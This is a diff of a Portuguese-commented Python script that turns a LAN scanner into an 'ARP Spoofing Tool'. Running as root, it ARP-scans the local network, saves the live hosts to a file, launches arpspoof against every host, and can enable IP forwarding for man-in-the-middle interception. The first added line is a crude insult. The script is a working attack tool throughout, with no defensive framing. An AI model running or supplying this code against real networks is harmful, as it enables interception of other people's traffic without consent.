@@ -1,196 +1,210 @@
-import argparse
+toma ai garrafa mijada
+
+import os
+import sys
 import subprocess
-import atexit
-from scapy.all import ARP, Ether, srp, sr, conf, IP, TCP
+import socket
+import psutil
 import ipaddress
+import argparse
+from scapy.all import ARP, Ether, srp
+
+
+# Verifica se está rodando como root
+if os.geteuid() != 0:
+    print("Execute como root.")
+    sys.exit(1)
+
+
+# Pega gateway e interface padrão
+def get_default_gateway():
+    result = subprocess.run(["ip", "route"], capture_output=True, text=True)
+
+    for line in result.stdout.splitlines():
+        if line.startswith("default"):
+            parts = line.split()
+            gateway = parts[2]
+            interface = parts[4]
+            return gateway, interface
+
+    return None, None
+
+
+# Obtém informações da LAN
+def get_lan_info():
+    gateway, interface = get_default_gateway()
+
+    if not gateway or not interface:
+        return None
+
+    interfaces = psutil.net_if_addrs()
+
+    for addr in interfaces[interface]:
+        if addr.family == socket.AF_INET:
+            return {
+                "interface": interface,
+                "ip": addr.address,
+                "netmask": addr.netmask,
+                "gateway": gateway
+            }
+
+    return None
+
+
+# Escaneia hosts ativos via ARP
+import ipaddress
+import socket
 import netifaces
-from concurrent.futures import ThreadPoolExecutor
+from scapy.all import ARP, Ether, srp
 
+def scan_hosts(interface, ip, netmask):
+    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
 
-# ---------------- NETWORK ----------------
-
-def is_private_ip(ip):
-    octets = ip.split(".")
-    if len(octets) != 4:
-        return False
-    o1, o2, *_ = map(int, octets)
-    return (o1 == 10) or (o1 == 172 and 16 <= o2 <= 31) or (o1 == 192 and o2 == 168)
-
-
-def get_network_info():
-    for iface in netifaces.interfaces():
-        addrs = netifaces.ifaddresses(iface)
-        if netifaces.AF_INET in addrs:
-            ip = addrs[netifaces.AF_INET][0].get("addr")
-            if ip and is_private_ip(ip):
-                gateways = netifaces.gateways()
-                gw_ip = None
-                if netifaces.AF_INET in gateways and gateways[netifaces.AF_INET]:
-                    for g in gateways[netifaces.AF_INET]:
-                        if g[1] == iface:
-                            gw_ip = g[0]
-                            break
-                return gw_ip, iface, ip
-    return None, None, None
-
-
-def get_network(ip):
-    return ipaddress.ip_network(ip + '/24', strict=False)
-
-
-# ---------------- SCANS ----------------
-
-def scan_arp(interface, network, exclude_ip=None):
-    print("[+] ARP scan...")
+    print(f"\nEscaneando rede: {network}\n")
 
     arp = ARP(pdst=str(network))
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = ether / arp
 
-    ans, _ = srp(packet, timeout=2, inter=0.05, iface=interface, verbose=0)
+    result = srp(packet, timeout=2, iface=interface, verbose=False)[0]
 
-    hosts = [r.psrc for _, r in ans if r.psrc != exclude_ip]
+    hosts_up = []
 
-    return hosts
+    for sent, received in result:
+        hosts_up.append(received.psrc)
 
-
-def scan_icmp_fallback(network):
-    print("[+] ICMP fallback scan...")
-
-    alive = []
-    for ip in network.hosts():
-        result = subprocess.run(
-            ["ping", "-c", "1", "-W", "1", str(ip)],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-        if result.returncode == 0:
-            alive.append(str(ip))
-
-    return alive
+    return hosts_up
 
 
-def scan_tcp_targets(hosts):
-    if not hosts:
-        return []
+# Remove gateway e IP local
+def filter_hosts(hosts, interface):
+    # IP da máquina
+    my_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
 
-    print("[+] TCP targeted scan...")
+    # Gateway padrão
+    gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
 
-    pkt = IP(dst=hosts) / TCP(dport=80, flags="S")
+    print(f"Removendo IP local: {my_ip}")
+    print(f"Removendo Gateway: {gateway}")
 
-    ans, _ = sr(pkt, timeout=2, verbose=0)
+    # Remove se estiver na lista
+    filtered_hosts = [ip for ip in hosts if ip != my_ip and ip != gateway]
 
-    alive = []
-    for _, r in ans:
-        if r.haslayer(TCP):
-            alive.append(r.src)
-
-    return alive
+    return filtered_hosts
 
 
-def hybrid_scan(interface, network, exclude_ip=None):
-    # 1. ARP primeiro (resolve MAC corretamente)
-    arp_hosts = scan_arp(interface, network, exclude_ip)
-
-    # 2. fallback se necessário
-    if not arp_hosts:
-        print("[!] Nenhum host via ARP, usando fallback ICMP...")
-        arp_hosts = scan_icmp_fallback(network)
-
-    # 3. TCP apenas nos hosts encontrados
-    tcp_hosts = scan_tcp_targets(arp_hosts)
-
-    # 4. merge
-    all_hosts = set(arp_hosts + tcp_hosts)
-
-    if exclude_ip:
-        all_hosts.discard(exclude_ip)
-
-    hosts = sorted(list(all_hosts))
-
-    # 5. salvar arquivo
-    with open("ip.txt", "w") as f:
+# Salva IPs no arquivo
+def save_hosts_to_file(hosts, filename="ips.txt"):
+    with open(filename, "w") as file:
         for ip in hosts:
-            f.write(ip + "\n")
+            file.write(ip + "\n")
 
-    print(f"[+] {len(hosts)} hosts encontrados (HYBRID STABLE)")
-
-    return hosts
+    print(f"\nIPs salvos em {filename}")
 
 
-# ---------------- EXEC ----------------
+def arp_spoofing(lan_info, file_path ):
+    processes = []
 
-def execute_system_command(interface, ip, gateway):
-    print(f"[+] Executando: arpspoof em {ip}")
-    subprocess.run(
-        ["sudo", "arpspoof", "-i", interface, "-t", gateway, ip],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
+    with open(file_path, 'r') as file:
+        ips = file.read().splitlines()
+
+    for ip in ips:
+        proc = subprocess.Popen([
+            "arpspoof",
+            "-i", lan_info["interface"],
+            "-t", ip,
+            lan_info["gateway"]
+        ])
+        processes.append(proc)
+
+    print(f"{len(processes)} ataques iniciados...")
+
+    try:
+        # Mantém o script rodando
+        for proc in processes:
+            proc.wait()
+
+    except KeyboardInterrupt:
+        print("\nEncerrando ataques...")
+
+        for proc in processes:
+            proc.terminate()
+
+        print("Finalizado.")
+
+def set_ip_forwarding(enable: bool):
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1" if enable else "0")
+
+        if enable:
+            print("[+] IP Forwarding habilitado.")
+        else:
+            print("[-] IP Forwarding desabilitado.")
+
+    except Exception as e:
+        print("Erro ao configurar IP Forwarding:", e)
+        sys.exit(1)
+
+
+# MAIN
+def main():
+    parser = argparse.ArgumentParser(
+        description="Scanner + ARP Spoofing Tool"
     )
 
+    parser.add_argument(
+        "--forward",
+        action="store_true",
+        help="Habilita IP Forwarding"
+    )
 
-# ---------------- PACKET FORWARDING ----------------
+    parser.add_argument(
+        "--no-forward",
+        action="store_true",
+        help="Desabilita IP Forwarding"
+    )
 
-def get_ip_forward_status():
-    with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
-        return f.read().strip()
-
-
-def set_ip_forward(value):
-    subprocess.run(["sudo", "sh", "-c", f"echo {value} > /proc/sys/net/ipv4/ip_forward"])
-
-
-def handle_packet_forwarding(enable):
-    original = get_ip_forward_status()
-
-    if enable:
-        if original == "0":
-            print("[+] Ativando packet forwarding")
-            set_ip_forward(1)
-
-        def restore():
-            print(f"[+] Restaurando packet forwarding para {original}")
-            set_ip_forward(int(original))
-
-        atexit.register(restore)
-    else:
-        print("[+] Packet forwarding não ativado")
-
-
-# ---------------- MAIN ----------------
-
-def main():
-    parser = argparse.ArgumentParser(description="Hybrid LAN Scanner (Fast & Stable)")
-    parser.add_argument("--packet_forwarding", action="store_true")
     args = parser.parse_args()
 
-    handle_packet_forwarding(args.packet_forwarding)
+    # Configuração do IP forwarding
+    if args.forward and args.no_forward:
+        print("Escolha apenas uma opção: --forward OU --no-forward")
+        sys.exit(1)
 
-    conf.verb = 0  # silencia warnings do scapy
+    if args.forward:
+        set_ip_forwarding(True)
 
-    gateway, iface, local_ip = get_network_info()
-    if not iface:
-        print("[-] Interface LAN não encontrada")
+    elif args.no_forward:
+        set_ip_forwarding(False)
+
+    lan_info = get_lan_info()
+
+    if not lan_info:
+        print("Não foi possível identificar a LAN.")
         return
 
-    print(f"[+] Interface: {iface}")
-    print(f"[+] IP local: {local_ip}")
-    print(f"[+] Gateway: {gateway}")
+    print("Interface:", lan_info["interface"])
+    print("IP Local:", lan_info["ip"])
+    print("Gateway:", lan_info["gateway"])
 
-    network = get_network(local_ip)
+    hosts = scan_hosts(
+        lan_info["interface"],
+        lan_info["ip"],
+        lan_info["netmask"]
+    )
 
-    hosts = hybrid_scan(iface, network, exclude_ip=gateway)
+    # Remove seu próprio IP
+    hosts = [ip for ip in hosts if ip != lan_info["ip"]]
 
-    print("[+] Hosts encontrados:")
+    print("\nHosts ativos encontrados:")
     for ip in hosts:
-        print(f" - {ip}")
+        print(ip)
 
-    # execução paralela
-    with ThreadPoolExecutor(max_workers=100) as executor:
-        for ip in hosts:
-            executor.submit(execute_system_command, iface, ip, gateway)
+    save_hosts_to_file(hosts)
 
-    print("[+] Execução paralela iniciada")
+    print("Starting SPOOF")
+    arp_spoofing(lan_info, file_path="ips.txt")
 
 
 if __name__ == "__main__":
